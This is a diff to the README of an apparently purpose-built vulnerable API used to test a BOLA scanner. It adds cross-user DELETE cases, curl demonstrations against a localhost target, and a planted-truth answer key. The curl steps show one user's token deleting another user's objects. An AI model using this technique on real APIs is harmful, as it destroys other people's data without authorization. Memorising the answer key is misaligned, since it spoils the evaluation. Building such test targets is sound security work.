@@ -80,6 +80,18 @@ read cross-path at `GET /api/gizmos/{id}` / `GET /api/sprockets/{id}` (id == own
 | bob   | `gizmo_bob_v0`    | `sprocket_bob_v0`    |
 | carol | `gizmo_carol_v0`  | `sprocket_carol_v0`  |
 
+Each user also owns one **relic**, one **badge** and one **seal** (the M1.3 X-DELETE cases). All
+three are deleted via `DELETE /api/users/{id}/relic|badge|seal` with **no GET on that path**; their
+state is read cross-path at `GET /api/relics|badges|seals/{id}` (id == owner id). The relic is
+**hard**-deleted (the row goes away → 404); the badge is **soft**-deleted (`status` flips
+`active` → `revoked`); the seal is the SECURE mirror (cross-user delete dropped):
+
+| user  | relic `label` | badge `label` / `status` | seal `label` |
+|-------|---------------|--------------------------|--------------|
+| alice | `relic_alice` | `badge_alice` / `active` | `seal_alice` |
+| bob   | `relic_bob`   | `badge_bob` / `active`   | `seal_bob`   |
+| carol | `relic_carol` | `badge_carol` / `active` | `seal_carol` |
+
 The token maps 1:1 to a user, and the user carries a `role`, so the token
 transitively **encodes which user (and thus their role)** — no crypto, this is a
 target. Log in to retrieve a token (static, so this is mostly a formality):
@@ -519,6 +531,62 @@ owner-identity and caller!=owner confirm for BOTH cases, so only causality separ
 
 ---
 
+## M1.3 delete-type additions (X-DELETE cases)
+
+All three deletes return a **byte-identical opaque `200 {"status":"ok"}`** and have **no same-path
+GET** (a GET returns 405). What separates them is only the cross-path STATE read *after* the delete
+— and, crucially, the state read taken *before* it: a missing object proves a deletion only if the
+object provably existed first.
+
+### X-DELETE-VULN-HARD — REAL delete BOLA, physical removal (relic)
+
+```bash
+# BEFORE (the existence anchor): Bob's relic exists
+curl -s http://127.0.0.1:8001/api/relics/2 -H 'Authorization: Bearer alice-token-aaaa'
+# -> {"id":2,"owner_id":2,"label":"relic_bob"}
+
+# Alice DELETES Bob's relic with HER token
+curl -s -X DELETE http://127.0.0.1:8001/api/users/2/relic -H 'Authorization: Bearer alice-token-aaaa'
+# -> {"status":"ok"}        (opaque — identical to the SECURE mirror)
+
+# AFTER: the object is physically GONE
+curl -s -o /dev/null -w '%{http_code}
+' http://127.0.0.1:8001/api/relics/2   -H 'Authorization: Bearer alice-token-aaaa'
+# -> 404
+```
+
+### X-DELETE-VULN-SOFT — REAL delete BOLA, logical/soft delete (badge)
+
+```bash
+curl -s http://127.0.0.1:8001/api/badges/2 -H 'Authorization: Bearer alice-token-aaaa'
+# -> {"id":2,"owner_id":2,"status":"active","label":"badge_bob"}
+
+curl -s -X DELETE http://127.0.0.1:8001/api/users/2/badge -H 'Authorization: Bearer alice-token-aaaa'
+# -> {"status":"ok"}
+
+# AFTER: still 200 — but the lifecycle field now reads a DELETED value
+curl -s http://127.0.0.1:8001/api/badges/2 -H 'Authorization: Bearer alice-token-aaaa'
+# -> {"id":2,"owner_id":2,"status":"revoked","label":"badge_bob"}
+```
+
+This is why **404 must not be the only accepted proof of vanishing** — most real APIs soft-delete.
+
+### X-DELETE-SAFE — SECURE mirror (seal)
+
+```bash
+curl -s -X DELETE http://127.0.0.1:8001/api/users/2/seal -H 'Authorization: Bearer alice-token-aaaa'
+# -> {"status":"ok"}        (byte-identical to the REAL deletes above)
+
+# AFTER: STILL PRESENT and unchanged — the cross-user delete was dropped
+curl -s http://127.0.0.1:8001/api/seals/2 -H 'Authorization: Bearer alice-token-aaaa'
+# -> {"id":2,"owner_id":2,"label":"seal_bob"}
+```
+
+A `verified` here is a **false positive**. Note the caller-identity anchor confirms for the SAFE
+case too (the object is still the victim's) — only the *negative assertion* separates them.
+
+---
+
 ## Planted-truth summary (ground truth / answer key)
 
 | case   | endpoint                              | planted truth          | how to confirm                                  |
@@ -538,6 +606,9 @@ owner-identity and caller!=owner confirm for BOTH cases, so only causality separ
 | X-EQUIV-SAFE | `GET /api/ledgers/{id}`       | **NOT vulnerable** (read-type secured control) | equal-length soft-200 denial: `owner_id:0`, `status:"DENY"`, zero-UUID — no victim data |
 | X-SILENT-VULN | `POST /api/users/{id}/gizmo`   | **REAL** (silent write, object-STATE confirmable) | cross-path STATE: `GET /api/gizmos/{id}` carries the unique written value (no same-path GET, no audit row) |
 | X-SILENT-SAFE | `POST /api/users/{id}/sprocket`| **NOT vulnerable** (silent-write secured mirror) | cross-path STATE: `GET /api/sprockets/{id}` still holds the ORIGINAL value — the unique value is ABSENT |
+| X-DELETE-VULN-HARD | `DELETE /api/users/{id}/relic` | **REAL** (delete BOLA, physical) | pre-flight STATE exists → after: `GET /api/relics/{id}` 404s (no same-path GET) |
+| X-DELETE-VULN-SOFT | `DELETE /api/users/{id}/badge` | **REAL** (delete BOLA, logical/soft) | pre-flight STATE `status:"active"` → after: still 200 but `status:"revoked"` |
+| X-DELETE-SAFE | `DELETE /api/users/{id}/seal`  | **NOT vulnerable** (delete secured mirror) | pre-flight STATE exists → after: object STILL PRESENT, unchanged |
 
 ---
 
@@ -553,7 +624,7 @@ rm vulnerable_target/vulnerable_target.db   # next start re-seeds Alice, Bob & C
 pytest vulnerable_target/test_vulns.py -v
 ```
 
-The suite (`test_vulns.py`, **19 tests**) automates the login + sanity checks and
+The suite (`test_vulns.py`, **25 tests**) automates the login + sanity checks and
 the **five core cases only — A, B, C, D, and the SAFE control**:
 - **Vuln A** — Alice's token reads Bob's order (single-shot diff).
 - **Vuln B** — Alice overwrites Bob's name; follow-up GET confirms the change;
